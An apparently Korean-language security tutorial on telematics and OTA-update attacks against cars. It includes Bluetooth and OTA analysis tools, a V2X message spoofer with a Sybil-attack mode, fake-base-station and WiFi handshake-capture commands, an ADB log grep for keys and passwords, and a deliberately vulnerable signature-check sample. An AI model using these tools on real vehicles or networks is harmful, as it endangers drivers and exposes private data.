> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 텔레매틱스 & OTA 업데이트 공격

## 0. 초보자를 위한 개념 이해

### 텔레매틱스와 OTA 공격이란?

텔레매틱스(Telematics)는 자동차와 외부 네트워크(인터넷, 셀룰러망)를 연결하는 통신 시스템이다. GPS 추적, 원격 진단, 긴급 구조 신호(eCall) 등을 제공한다. OTA(Over-the-Air) 업데이트는 이 통신 채널을 통해 ECU 펌웨어를 원격으로 업데이트하는 기능이다. 이 두 기능이 결합되면 차량을 원격에서 해킹하거나, OTA 서버를 침해해 수백만 대에 악성 펌웨어를 배포하는 공격이 가능해진다.

**왜 배우는가:**
```
[텔레매틱스 공격의 파급력]

  인터넷 ──── 셀룰러망(4G/5G) ──── TCU(텔레매틱스 유닛)
                                        ↓
                                   차량 내부 CAN 버스
                                        ↓
                                   엔진/브레이크/조향 ECU

  [2015년 Jeep Cherokee 원격 해킹]
  연구자들이 셀룰러 망을 통해 Jeep Uconnect 취약점 악용
  → 고속도로 주행 중 에어컨, 오디오, 브레이크 원격 제어
  → FCA 140만 대 리콜, 차량 소환 역사상 최대 규모 중 하나

  [OTA 공격 시나리오]
  OTA 서버 침해 → 악성 펌웨어 서명 → 수백만 대 동시 배포
```

### 핵심 개념 정리

```
[TCU 공격 표면]

외부 인터페이스:
  4G/5G 셀룰러: 인터넷 연결, SMS 수신
  GPS: 위치 정보 (읽기, 스푸핑 가능)
  Bluetooth 5.0: 스마트폰 연동 (페어링 취약점)
  Wi-Fi 802.11ac: 핫스팟 기능

내부 인터페이스:
  CAN 버스 게이트웨이: 외부↔내부 브리지
  이더넷: ADAS 카메라 연결

OTA 업데이트 보안 요소:
  ★ 취약: 서명 미검증, HTTPS 미사용, 롤백 가능
  ★ 안전: 코드 서명(RSA/ECDSA), TLS 핀닝, 버전 검증

[V2X (Vehicle-to-Everything) 통신]
  V2V: 차량 간 충돌 경고
  V2I: 신호등, 도로 인프라
  취약점: GPS 스푸핑, DSRC 재전송 공격
```

### 필요한 도구 및 환경
- **HackRF One / USRP**: 소프트웨어 정의 라디오 (셀룰러 분석)
- **Wireshark + 자동차 플러그인**: 차량 네트워크 패킷 분석
- **mitmproxy / Burp Suite**: OTA 업데이트 트래픽 가로채기
- **gqrx**: SDR 수신기 소프트웨어 (GPS/셀룰러 신호 모니터링)

### 기초 실습 예제
```python
import hashlib
import hmac
import struct

def verify_ota_package(
    firmware_data: bytes,
    signature: bytes,
    public_key_hint: str = "RSA-2048"
) -> dict:
    """
    OTA 펌웨어 패키지의 보안 속성을 검사한다.
    실제 서명 검증은 제조사 공개키가 필요하므로 여기서는 구조 분석만 수행.
    """
    result = {
        "크기": len(firmware_data),
        "SHA256": hashlib.sha256(firmware_data).hexdigest(),
        "서명 있음": len(signature) > 0,
        "서명 크기": len(signature),
        "예상 키 유형": public_key_hint,
    }

    # 헤더 분석 (가상의 OTA 패키지 형식)
    if len(firmware_data) >= 16:
        magic = firmware_data[:4]
        version = struct.unpack('>I', firmware_data[4:8])[0]
        fw_size = struct.unpack('>I', firmware_data[8:12])[0]

        result["매직 바이트"] = magic.hex()
        result["버전"] = version
        result["선언된 크기"] = fw_size
        result["크기 일치"] = (fw_size == len(firmware_data))

    # 보안 권고
    warnings = []
    if not result["서명 있음"]:
        warnings.append("[!] 서명 없음 → 변조 탐지 불가!")
    if result.get("크기 일치") is False:
        warnings.append("[!] 선언 크기와 실제 크기 불일치 → 손상 또는 변조!")

    result["경고"] = warnings

    for k, v in result.items():
        print(f"  {k}: {v}")

    return result

# 사용 예시
# with open("firmware_update.bin", "rb") as f:
#     fw_data = f.read()
# verify_ota_package(fw_data, b"")
```

---

## 1. 텔레매틱스 유닛(TCU) 구조

### 1.1 TCU 하드웨어 구성

```
┌─────────────────────────────────────────────────┐
│                   TCU 메인보드                    │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌───────────────┐  │
│  │ LTE/5G   │  │  GPS     │  │  Bluetooth    │  │
│  │ 모뎀     │  │  수신기  │  │  5.0 모듈     │  │
│  └──────────┘  └──────────┘  └───────────────┘  │
│  ┌──────────┐  ┌──────────┐  ┌───────────────┐  │
│  │  WiFi    │  │  ARM CPU │  │  CAN 인터페이스│  │
│  │ 802.11ac │  │  A72     │  │  게이트웨이   │  │
│  └──────────┘  └──────────┘  └───────────────┘  │
│  ┌──────────┐  ┌──────────────────────────────┐  │
│  │  eMMC    │  │  eSIM / USIM 소켓            │  │
│  │  32GB    │  └──────────────────────────────┘  │
│  └──────────┘                                    │
└─────────────────────────────────────────────────┘
```

### 1.2 TCU 공격 표면

| 인터페이스 | 프로토콜 | 공격 벡터 |
|-----------|---------|----------|
| 셀룰러 | LTE/5G + SMS | 취약 SMS 파서, SS7 공격 |
| Bluetooth | BLE + RFCOMM | PIN 브루트포스, 페어링 우회 |
| WiFi | 802.11ac | WPA2 크랙, 핫스팟 이용 |
| USB OBD-II | CAN/ISO 14229 | 로컬 리플레이 공격 |
| GNSS | GPS/GLONASS | 스푸핑 → 위치 조작 |

### 1.3 TCU 소프트웨어 스택

```
Android Automotive OS / QNX / Linux
├── TEE (Trustzone) - 암호화 키, 보안 부트
├── Hypervisor (선택) - 도메인 격리
├── Modem 데몬 - 셀룰러 연결 관리
├── OTA 에이전트 - 업데이트 수신/적용
├── Telematics 앱 - OEM 서버 통신
└── CAN 게이트웨이 - 차량 내부 네트워크
```

---

## 2. V2X(Vehicle-to-Everything) 통신

### 2.1 DSRC vs. C-V2X 비교

| 항목 | DSRC (802.11p) | C-V2X (PC5/Uu) |
|------|---------------|----------------|
| 주파수 | 5.9 GHz | 5.9 GHz (PC5) / LTE |
| 표준 | IEEE 1609.x | 3GPP |
| 레이턴시 | 2-5ms | 1-3ms |
| 인증 | IEEE 1609.2 | 3GPP 기반 |
| 보안 취약점 | 가짜 BSM 브로드캐스트 | 네트워크 레벨 공격 |

### 2.2 V2X 보안 취약점

**WAVE/DSRC 레이어 공격:**
```
1. BSM(Basic Safety Message) 스푸핑
   - 가짜 차량 위치 브로드캐스트
   - Sybil Attack: 하나의 장치가 다수의 차량 ID 위장
   
2. DoS 공격
   - 채널 포화: 대량 WSMP 패킷 전송
   - 메시지 인젝션으로 긴급 경보 남발

3. 인증서 추적
   - 익명 인증서(pseudonym)이나 교체 주기 부족 시 추적 가능
```

### 2.3 IEEE 1609.2 인증서 구조 분석

```python
# IEEE 1609.2 인증서 파싱 (asn1crypto 사용)
from asn1crypto import core, pem
import struct

def parse_1609_cert(cert_bytes: bytes) -> dict:
    """IEEE 1609.2 V2X 인증서 파싱"""
    # 단순화된 파서 - 실제는 OASP 1609.2 ASN.1 스키마 사용
    result = {
        "version": cert_bytes[0],
        "issuer_hash": cert_bytes[1:9].hex(),
        "validity_period": {
            "start": struct.unpack(">I", cert_bytes[9:13])[0],
            "duration": struct.unpack(">H", cert_bytes[13:15])[0]
        }
    }
    return result
```

---

## 3. 원격 공격 벡터

### 3.1 셀룰러 인터페이스 공격

**SMS 기반 공격:**
```bash
# 페이크 기지국(IMSI Catcher) 구성 - 연구 목적
# OpenBTS + BladeRF/USRP 사용
sudo apt install openbts
# /etc/OpenBTS/OpenBTS.conf 설정
# GSM.Identity.ShortName = "TEST_NET"
# GSM.Radio.Band = 900

# SMS PDU 스니핑
sudo python3 -c "
import serial
s = serial.Serial('/dev/ttyUSB0', 115200)
s.write(b'AT+CNMI=2,2,0,0,0\r\n')
while True:
    line = s.readline()
    if b'+CMT:' in line:
        print('SMS 수신:', line)
"
```

**LTE 프로토콜 취약점 도구:**
```bash
# srsRAN으로 LTE 패킷 캡처 (수동 모드)
git clone https://github.com/srsran/srsRAN_4G
cd srsRAN_4G && mkdir build && cd build
cmake .. -DENABLE_GUI=FALSE && make -j4

# LTE 패킷 캡처
sudo ./srsue/src/srsue --rf.device_name=uhd \
  --pcap.enable=true --pcap.filename=lte_capture.pcap
```

### 3.2 Bluetooth 공격

**차량 Bluetooth 디바이스 스캐너:**

```python
#!/usr/bin/env python3
"""
automotive_bt_scanner.py — 차량 Bluetooth 디바이스 스캐너
"""

from __future__ import annotations

import argparse
import asyncio
import json
import sys
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from bleak import BleakScanner, BleakClient
from bleak.backends.device import BLEDevice
from bleak.backends.scanner import AdvertisementData


# 차량 관련 Bluetooth 클래스/UUID 패턴
AUTOMOTIVE_SIGNATURES = {
    "hands_free": "0000111e",     # HFP (Hands-Free Profile)
    "audio":      "0000110b",     # A2DP Sink
    "obd_dongle": "00001101",     # SPP (OBD-II 동글)
    "car_audio":  "0000110d",     # A2DP Source
    "vehicle_net": "00001812",    # HID over GATT (일부 TCU)
}

KNOWN_AUTOMOTIVE_VENDORS = {
    "00:17:EB": "Continental TCU",
    "40:23:43": "Harman Infotainment",
    "A4:C3:F0": "Bosch TCU",
    "DC:2C:26": "Visteon",
}


@dataclass
class AutomotiveDevice:
    address: str
    name: str
    rssi: int
    uuids: list[str]
    manufacturer_data: dict
    automotive_type: str | None
    vendor: str | None
    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> dict:
        return {
            "address": self.address,
            "name": self.name,
            "rssi": self.rssi,
            "uuids": self.uuids,
            "automotive_type": self.automotive_type,
            "vendor": self.vendor,
            "first_seen": self.first_seen,
        }


def classify_automotive(uuids: list[str], address: str) -> tuple[str | None, str | None]:
    """디바이스가 차량 관련인지 분류"""
    automotive_type = None
    vendor = None

    # UUID 기반 분류
    for uuid in uuids:
        short_uuid = uuid[:8].lower()
        for atype, sig in AUTOMOTIVE_SIGNATURES.items():
            if short_uuid == sig:
                automotive_type = atype
                break

    # OUI 기반 제조사 식별
    oui = address[:8].upper()
    vendor = KNOWN_AUTOMOTIVE_VENDORS.get(oui)

    return automotive_type, vendor


async def enumerate_gatt(client: BleakClient, address: str) -> list[str]:
    """GATT 서비스 열거"""
    services = []
    try:
        for service in client.services:
            services.append(f"{service.uuid}: {service.description}")
            for char in service.characteristics:
                props = ",".join(char.properties)
                services.append(f"  └─ {char.uuid} [{props}]")
    except Exception as e:
        services.append(f"GATT 열거 실패: {e}")
    return services


async def scan_automotive_bt(
    duration: float,
    enumerate: bool,
    output: Path | None,
) -> list[AutomotiveDevice]:
    """차량 Bluetooth 디바이스 스캔"""
    found_devices: list[AutomotiveDevice] = []
    device_map: dict[str, BLEDevice] = {}
    adv_map: dict[str, AdvertisementData] = {}

    def detection_callback(device: BLEDevice, adv_data: AdvertisementData):
        device_map[device.address] = device
        adv_map[device.address] = adv_data

    print(f"[*] {duration}초 동안 Bluetooth LE 스캔 중...")
    scanner = BleakScanner(detection_callback=detection_callback)
    await scanner.start()
    await asyncio.sleep(duration)
    await scanner.stop()

    print(f"[+] {len(device_map)}개 디바이스 발견")

    for address, device in device_map.items():
        adv = adv_map.get(address)
        if not adv:
            continue

        uuids = [str(u) for u in (adv.service_uuids or [])]
        mfr_data = {k: v.hex() for k, v in (adv.manufacturer_data or {}).items()}

        automotive_type, vendor = classify_automotive(uuids, address)

        # 차량 관련 또는 이름에 차량 키워드 포함된 경우만 필터
        name = device.name or ""
        is_automotive = (
            automotive_type is not None
            or vendor is not None
            or any(kw in name.upper() for kw in ["CAR", "AUTO", "BMW", "HYUNDAI", "KIA",
                                                   "TOYOTA", "TESLA", "TCU", "OBD"])
        )

        dev = AutomotiveDevice(
            address=address,
            name=name or "Unknown",
            rssi=adv.rssi or -100,
            uuids=uuids,
            manufacturer_data=mfr_data,
            automotive_type=automotive_type,
            vendor=vendor,
        )
        found_devices.append(dev)

        prefix = "[CAR]" if is_automotive else "[   ]"
        print(f"{prefix} {address} | {name:<30} | RSSI: {adv.rssi:>4} | {automotive_type or ''}")

        # GATT 서비스 열거 (선택)
        if enumerate and is_automotive:
            print(f"       GATT 서비스 열거: {address}")
            try:
                async with BleakClient(address, timeout=10.0) as client:
                    services = await enumerate_gatt(client, address)
                    for svc in services:
                        print(f"       {svc}")
            except Exception as e:
                print(f"       연결 실패: {e}")

    # 결과 저장
    if output:
        results = [d.to_dict() for d in found_devices]
        output.write_text(json.dumps(results, ensure_ascii=False, indent=2))
        print(f"\n[+] 결과 저장: {output}")

    return found_devices


def main() -> None:
    parser = argparse.ArgumentParser(
        description="차량 Bluetooth 디바이스 스캐너",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  %(prog)s                          # 기본 30초 스캔
  %(prog)s -t 60 -e                 # 60초 스캔 + GATT 열거
  %(prog)s -t 120 -o results.json   # 결과 파일 저장
        """,
    )
    parser.add_argument("-t", "--timeout", type=float, default=30.0,
                        help="스캔 시간 (초, 기본: 30)")
    parser.add_argument("-e", "--enumerate", action="store_true",
                        help="차량 디바이스 GATT 서비스 열거")
    parser.add_argument("-o", "--output", type=Path, default=None,
                        help="결과 JSON 파일 경로")
    args = parser.parse_args()

    try:
        devices = asyncio.run(
            scan_automotive_bt(args.timeout, args.enumerate, args.output)
        )
        automotive = [d for d in devices if d.automotive_type or d.vendor]
        print(f"\n[요약] 전체: {len(devices)}개, 차량 관련: {len(automotive)}개")
    except KeyboardInterrupt:
        print("\n[!] 스캔 중단")
        sys.exit(0)


if __name__ == "__main__":
    main()
```

### 3.3 WiFi 공격

**TCU WiFi 핫스팟 취약점:**
```bash
# TCU가 노출하는 WiFi AP 스캔
sudo airodump-ng wlan0mon --band abg -w automotive_scan

# WPA2-PSK 핸드셰이크 캡처
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# 기본 PIN 공격 (제조사별 패턴)
# Hyundai: 마지막 8자리 시리얼 번호
# 일부 TCU: VIN 기반 생성
cat << 'EOF' > vin_to_pin.py
#!/usr/bin/env python3
import hashlib, sys

def vin_to_wifi_pin(vin: str) -> str:
    """VIN → WiFi PIN 변환 (일부 OEM 취약 구현 시뮬레이션)"""
    h = hashlib.sha256(vin.encode()).hexdigest()
    return h[:8].upper()

if __name__ == "__main__":
    vin = sys.argv[1] if len(sys.argv) > 1 else "1HGBH41JXMN109186"
    print(f"VIN: {vin} → PIN: {vin_to_wifi_pin(vin)}")
EOF
```

---

## 4. OTA 업데이트 메커니즘 분석

### 4.1 OTA 아키텍처

```
OEM 클라우드 서버
      │
      │ HTTPS TLS 1.3
      ▼
  TCU OTA 에이전트
      │
      ├─ 서명 검증 (코드 서명 인증서)
      ├─ 암호화 복호화 (AES-256-GCM)
      ├─ 무결성 검사 (SHA-256)
      └─ A/B 파티션 교체
            │
            └─ Secure Boot → 부트로더 검증
```

### 4.2 OTA 패키지 분석 도구

```python
#!/usr/bin/env python3
"""
ota_analyzer.py — 자동차 OTA 패키지 분석 도구
"""

from __future__ import annotations

import argparse
import hashlib
import json
import struct
import zipfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, ec
from cryptography.x509 import load_pem_x509_certificate
from cryptography.exceptions import InvalidSignature


@dataclass
class OTAPackageInfo:
    filename: str
    size: int
    sha256: str
    format: str
    metadata: dict[str, Any]
    signature_valid: bool | None
    files: list[str]


def detect_ota_format(data: bytes) -> str:
    """OTA 패키지 포맷 감지"""
    magic_signatures = {
        b"PK\x03\x04": "ZIP/Android OTA",
        b"\x1f\x8b": "gzip",
        b"BZh": "bzip2",
        b"\xfd7zXZ": "XZ",
        b"OTA!": "Proprietary OTA",
        b"BSDIFF40": "bsdiff 패치",
        b"\x89PNG": "PNG (잘못된 파일)",
    }
    for magic, fmt in magic_signatures.items():
        if data[:len(magic)] == magic:
            return fmt
    return "Unknown"


def extract_ota_metadata(pkg_path: Path) -> dict[str, Any]:
    """OTA 패키지 메타데이터 추출"""
    metadata: dict[str, Any] = {}

    if not zipfile.is_zipfile(pkg_path):
        return {"error": "ZIP 포맷 아님"}

    with zipfile.ZipFile(pkg_path, "r") as zf:
        # Android OTA 스타일 메타데이터
        for meta_file in ["META-INF/com/android/metadata",
                          "META-INF/otacerts.zip",
                          "payload.bin",
                          "payload_properties.txt",
                          "update_manifest.json"]:
            if meta_file in zf.namelist():
                try:
                    content = zf.read(meta_file)
                    if meta_file.endswith(".json"):
                        metadata[meta_file] = json.loads(content)
                    elif meta_file.endswith(".txt"):
                        metadata[meta_file] = content.decode("utf-8", errors="replace")
                    else:
                        metadata[meta_file] = {
                            "size": len(content),
                            "sha256": hashlib.sha256(content).hexdigest(),
                        }
                except Exception as e:
                    metadata[meta_file] = {"error": str(e)}

    return metadata


def verify_ota_signature(
    pkg_path: Path,
    cert_path: Path | None,
) -> tuple[bool | None, str]:
    """OTA 패키지 서명 검증"""
    if not cert_path or not cert_path.exists():
        return None, "인증서 없음 — 서명 검증 생략"

    try:
        cert_data = cert_path.read_bytes()
        cert = load_pem_x509_certificate(cert_data)
        pub_key = cert.public_key()

        with zipfile.ZipFile(pkg_path, "r") as zf:
            # COMMENT 필드에 서명이 있는 경우 (Android OTA 방식)
            comment = zf.comment
            if not comment:
                return None, "ZIP 코멘트에 서명 없음"

            # 서명 오프셋 파싱 (Android OTA 형식)
            if len(comment) < 6:
                return None, "코멘트가 너무 짧음"

            sig_offset = struct.unpack("<H", comment[-6:-4])[0]
            sig_data = comment[-sig_offset:]

            # 패키지 해시 계산 (서명 부분 제외)
            pkg_data = pkg_path.read_bytes()
            signed_data = pkg_data[:-len(comment)] + comment[:-sig_offset]
            digest = hashlib.sha256(signed_data).digest()

            try:
                if isinstance(pub_key, ec.EllipticCurvePublicKey):
                    pub_key.verify(sig_data, digest, ec.ECDSA(hashes.Prehashed()))
                else:
                    pub_key.verify(sig_data, digest, padding.PKCS1v15(), hashes.SHA256())
                return True, "서명 유효"
            except InvalidSignature:
                return False, "서명 무효 — 패키지 변조 가능성"

    except Exception as e:
        return None, f"검증 오류: {e}"


def analyze_payload_bin(pkg_path: Path) -> dict[str, Any]:
    """Android OTA payload.bin 분석 (헤더만)"""
    if not zipfile.is_zipfile(pkg_path):
        return {}

    with zipfile.ZipFile(pkg_path, "r") as zf:
        if "payload.bin" not in zf.namelist():
            return {}

        with zf.open("payload.bin") as f:
            header = f.read(4)
            if header != b"CrAU":
                return {"error": "payload.bin CrAU 매직 없음"}

            version = struct.unpack(">Q", f.read(8))[0]
            manifest_size = struct.unpack(">Q", f.read(8))[0]
            metadata_sig_size = struct.unpack(">I", f.read(4))[0]

            return {
                "format": "Chrome OS / Android OTA",
                "version": version,
                "manifest_size": manifest_size,
                "metadata_sig_size": metadata_sig_size,
            }


def analyze_ota_package(
    pkg_path: Path,
    cert_path: Path | None,
    verbose: bool,
) -> OTAPackageInfo:
    """OTA 패키지 종합 분석"""
    data = pkg_path.read_bytes()
    sha256 = hashlib.sha256(data).hexdigest()
    fmt = detect_ota_format(data)
    metadata = extract_ota_metadata(pkg_path)

    # payload.bin 분석
    payload_info = analyze_payload_bin(pkg_path)
    if payload_info:
        metadata["payload_bin"] = payload_info

    # 서명 검증
    sig_valid, sig_msg = verify_ota_signature(pkg_path, cert_path)

    # 파일 목록
    files: list[str] = []
    if zipfile.is_zipfile(pkg_path):
        with zipfile.ZipFile(pkg_path, "r") as zf:
            files = zf.namelist()
            if not verbose:
                files = files[:20]

    info = OTAPackageInfo(
        filename=pkg_path.name,
        size=len(data),
        sha256=sha256,
        format=fmt,
        metadata=metadata,
        signature_valid=sig_valid,
        files=files,
    )

    # 출력
    print(f"\n{'='*60}")
    print(f"OTA 패키지 분석 결과")
    print(f"{'='*60}")
    print(f"파일: {info.filename}")
    print(f"크기: {info.size:,} bytes ({info.size/1024/1024:.1f} MB)")
    print(f"포맷: {info.format}")
    print(f"SHA256: {info.sha256}")
    print(f"서명: {sig_msg}")

    if info.metadata:
        print(f"\n[메타데이터]")
        print(json.dumps(info.metadata, ensure_ascii=False, indent=2))

    if verbose and info.files:
        print(f"\n[파일 목록 ({len(info.files)}개)]")
        for f in info.files[:50]:
            print(f"  {f}")

    return info


def main() -> None:
    parser = argparse.ArgumentParser(
        description="자동차 OTA 패키지 분석기",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  %(prog)s firmware.zip
  %(prog)s firmware.zip --cert oem_cert.pem
  %(prog)s firmware.zip -v --output analysis.json
        """,
    )
    parser.add_argument("package", type=Path, help="OTA 패키지 파일")
    parser.add_argument("--cert", type=Path, default=None,
                        help="서명 검증용 OEM 인증서 (PEM)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="상세 파일 목록 출력")
    parser.add_argument("-o", "--output", type=Path, default=None,
                        help="분석 결과 JSON 저장")
    args = parser.parse_args()

    if not args.package.exists():
        print(f"[오류] 파일 없음: {args.package}")
        raise SystemExit(1)

    info = analyze_ota_package(args.package, args.cert, args.verbose)

    if args.output:
        result = {
            "filename": info.filename,
            "size": info.size,
            "sha256": info.sha256,
            "format": info.format,
            "signature_valid": info.signature_valid,
            "metadata": info.metadata,
            "file_count": len(info.files),
        }
        args.output.write_text(json.dumps(result, ensure_ascii=False, indent=2))
        print(f"\n[+] 분석 결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

### 4.3 OTA 서명 우회 취약점

**취약한 서명 검증 패턴:**
```python
# 취약한 구현 예시 (실제 CVE에서 발견된 패턴)
def vulnerable_verify(package_path: str, signature: bytes) -> bool:
    # 취약점 1: 길이 확인 없이 비교 (타이밍 공격 가능)
    expected = compute_signature(package_path)
    return signature == expected  # == 는 단락 평가

# 취약점 2: 버전 롤백 허용
def check_version(new_ver: str, current_ver: str) -> bool:
    # 버전 비교 없이 항상 허용
    return True  # 롤백 공격 가능

# 취약점 3: 서명 키 하드코딩 + 디버그 모드
DEBUG_CERT = b"-----BEGIN CERTIFICATE-----\nMIIB..."
if os.getenv("OTA_DEBUG") == "1":
    return True  # 디버그 환경변수로 우회
```

**안전한 구현:**
```python
import hmac
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes

def secure_verify(package_data: bytes, signature: bytes, public_key) -> bool:
    """상수 시간 비교 + 강력한 서명 검증"""
    try:
        # ECDSA P-384 서명 검증
        public_key.verify(
            signature,
            package_data,
            ec.ECDSA(hashes.SHA384())
        )
        return True
    except Exception:
        return False

def check_version_strictly(new_ver: tuple, current_ver: tuple) -> bool:
    """버전 롤백 방지 — 새 버전이 현재보다 높아야만 허용"""
    return new_ver > current_ver
```

---

## 5. 인포테인먼트 시스템 공격

### 5.1 Android Automotive 취약점 표면

```
인포테인먼트 공격 표면:
├── USB 인터페이스
│   ├── Android Auto / CarPlay 프로토콜
│   ├── ADB (개발자 모드)
│   └── USB Mass Storage
├── 앱 샌드박스 탈출
│   ├── system_server 취약점
│   ├── Binder IPC 취약점
│   └── WebView (브라우저 내 RCE)
├── Bluetooth Stack
│   ├── BlueFrag (CVE-2020-0022)
│   └── BIAS / KNOB 공격
└── 네트워크
    ├── mDNS/Bonjour 서비스
    └── Cast/Miracast 프로토콜
```

### 5.2 ADB를 통한 인포테인먼트 접근

```bash
# USB ADB 연결 (개발자 모드 활성화된 경우)
adb devices
adb shell

# 차량 관련 시스템 프로퍼티 확인
adb shell getprop | grep -E "ro.car|ro.vehicle|persist.car"

# CarService 상태 확인
adb shell dumpsys car_service | head -100

# CAN 버스 접근 (HAL을 통해)
adb shell dumpsys android.hardware.automotive.vehicle@2.0::IVehicle/default

# 로그에서 민감 정보 추출
adb logcat -d | grep -E "VIN|TOKEN|KEY|PASSWORD|SECRET"
```

### 5.3 V2X BSM 메시지 파서 및 변조 시뮬레이터

```python
#!/usr/bin/env python3
"""
v2x_bsm_tool.py — V2X BSM 메시지 파서 및 시뮬레이터
"""

from __future__ import annotations

import argparse
import random
import socket
import struct
import time
from dataclasses import dataclass, field
from typing import Any


@dataclass
class BSMMessage:
    """IEEE 1609.2 Basic Safety Message (단순화)"""
    msg_count: int
    temp_id: bytes
    dsec_offset: int     # DSRC Second (0-65535)
    latitude: float      # 1/10 micro degree
    longitude: float     # 1/10 micro degree
    elevation: int       # 2cm 단위
    speed: float         # 0.02 m/s 단위
    heading: float       # 0.0125 deg 단위
    accel_set: dict[str, float] = field(default_factory=dict)

    def to_bytes(self) -> bytes:
        """BSM → 바이너리 직렬화 (단순화된 포맷)"""
        lat_enc = int(self.latitude * 10_000_000)
        lon_enc = int(self.longitude * 10_000_000)
        speed_enc = int(self.speed / 0.02)
        heading_enc = int(self.heading / 0.0125)

        return struct.pack(
            ">B4sHiihHH",
            self.msg_count & 0xFF,
            self.temp_id[:4],
            self.dsec_offset,
            lat_enc,
            lon_enc,
            self.elevation,
            speed_enc,
            heading_enc,
        )

    @classmethod
    def from_bytes(cls, data: bytes) -> "BSMMessage":
        """바이너리 → BSM 파싱"""
        if len(data) < 22:
            raise ValueError(f"BSM 너무 짧음: {len(data)} bytes")

        msg_count, temp_id, dsec, lat_enc, lon_enc, elev, speed_enc, heading_enc = \
            struct.unpack(">B4sHiihHH", data[:22])

        return cls(
            msg_count=msg_count,
            temp_id=temp_id,
            dsec_offset=dsec,
            latitude=lat_enc / 10_000_000,
            longitude=lon_enc / 10_000_000,
            elevation=elev,
            speed=speed_enc * 0.02,
            heading=heading_enc * 0.0125,
        )

    def display(self) -> str:
        return (
            f"BSM #{self.msg_count} | TempID: {self.temp_id.hex()} | "
            f"Lat: {self.latitude:.6f} | Lon: {self.longitude:.6f} | "
            f"Speed: {self.speed:.1f} m/s | Heading: {self.heading:.1f}°"
        )


def generate_sybil_attack(
    base_lat: float,
    base_lon: float,
    num_vehicles: int,
    duration: float,
    target: tuple[str, int],
) -> None:
    """Sybil Attack: 다수의 가짜 차량 BSM 생성 및 전송"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    msg_count = 0

    print(f"[*] Sybil Attack: {num_vehicles}개 가짜 차량 → {target[0]}:{target[1]}")

    while time.time() < end_time:
        for i in range(num_vehicles):
            # 가짜 TempID 생성
            fake_id = bytes([random.randint(0, 255) for _ in range(4)])
            # 위치 약간씩 변동
            lat = base_lat + (random.random() - 0.5) * 0.001
            lon = base_lon + (random.random() - 0.5) * 0.001

            bsm = BSMMessage(
                msg_count=msg_count & 0xFF,
                temp_id=fake_id,
                dsec_offset=int(time.time() * 1000) % 65535,
                latitude=lat,
                longitude=lon,
                elevation=200,
                speed=random.uniform(0, 20),
                heading=random.uniform(0, 360),
            )
            pkt = bsm.to_bytes()
            sock.sendto(pkt, target)
            msg_count += 1

        time.sleep(0.1)  # 10 Hz

    sock.close()
    print(f"[+] 전송 완료: {msg_count}개 BSM")


def capture_and_parse(
    listen_ip: str,
    listen_port: int,
    count: int,
) -> list[BSMMessage]:
    """BSM 수신 및 파싱"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((listen_ip, listen_port))
    sock.settimeout(30.0)

    messages: list[BSMMessage] = []
    print(f"[*] BSM 수신 대기: {listen_ip}:{listen_port}")

    while len(messages) < count:
        try:
            data, addr = sock.recvfrom(1024)
            bsm = BSMMessage.from_bytes(data)
            messages.append(bsm)
            print(f"  [{addr[0]}] {bsm.display()}")
        except TimeoutError:
            break
        except Exception as e:
            print(f"  [파싱 오류] {e}")

    sock.close()
    return messages


def main() -> None:
    parser = argparse.ArgumentParser(
        description="V2X BSM 분석 & 시뮬레이션 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  %(prog)s capture --port 5900 --count 100
  %(prog)s sybil --lat 37.5665 --lon 126.9780 --vehicles 50
  %(prog)s parse --file capture.bin
        """,
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # capture 서브커맨드
    cap = sub.add_parser("capture", help="BSM 수신 및 파싱")
    cap.add_argument("--ip", default="0.0.0.0")
    cap.add_argument("--port", type=int, default=5900)
    cap.add_argument("--count", type=int, default=100)

    # sybil 서브커맨드
    syb = sub.add_parser("sybil", help="Sybil Attack 시뮬레이션")
    syb.add_argument("--lat", type=float, required=True)
    syb.add_argument("--lon", type=float, required=True)
    syb.add_argument("--vehicles", type=int, default=10)
    syb.add_argument("--duration", type=float, default=30.0)
    syb.add_argument("--target-ip", default="127.0.0.1")
    syb.add_argument("--target-port", type=int, default=5900)

    args = parser.parse_args()

    if args.command == "capture":
        capture_and_parse(args.ip, args.port, args.count)
    elif args.command == "sybil":
        generate_sybil_attack(
            args.lat, args.lon, args.vehicles, args.duration,
            (args.target_ip, args.target_port),
        )


if __name__ == "__main__":
    main()
```

---

## 6. 실제 사례 분석

### 6.1 Jeep Cherokee 원격 해킹 (2015)

**공격 체인:**
```
인터넷 → Sprint 셀룰러 네트워크
  └→ TCU (Uconnect) 노출된 포트 6667 (D-Bus)
       └→ D-Bus 통해 인포테인먼트 OS 접근
            └→ V850 CAN 게이트웨이 펌웨어 재플래시
                 └→ CAN 버스 직접 명령 주입
                      └→ 브레이크/스티어링/엔진 제어
```

**영향 규모:** 140만 대 리콜

**패치 내용:**
- Sprint 네트워크 레벨에서 차량 간 통신 차단
- Uconnect 소프트웨어 업데이트 (USB/OTA)
- D-Bus 서비스 인증 강화

### 6.2 Tesla OTA 취약점 이력

| 연도 | CVE | 취약점 | 영향 |
|------|-----|--------|------|
| 2020 | CVE-2020-10558 | 미디어 파서 RCE | 모델 3 |
| 2021 | CVE-2021-41282 | WiFi 드라이버 오버플로우 | 다수 모델 |
| 2022 | CVE-2022-45414 | 브라우저 UAF → 코드 실행 | 인포테인먼트 |
| 2023 | CVE-2023-26223 | BLE 페어링 우회 | 모델 S/3/X/Y |

---

## 7. 방어 전략

### 7.1 TCU 하드닝 체크리스트

```
[ ] 미사용 Bluetooth/WiFi 인터페이스 비활성화
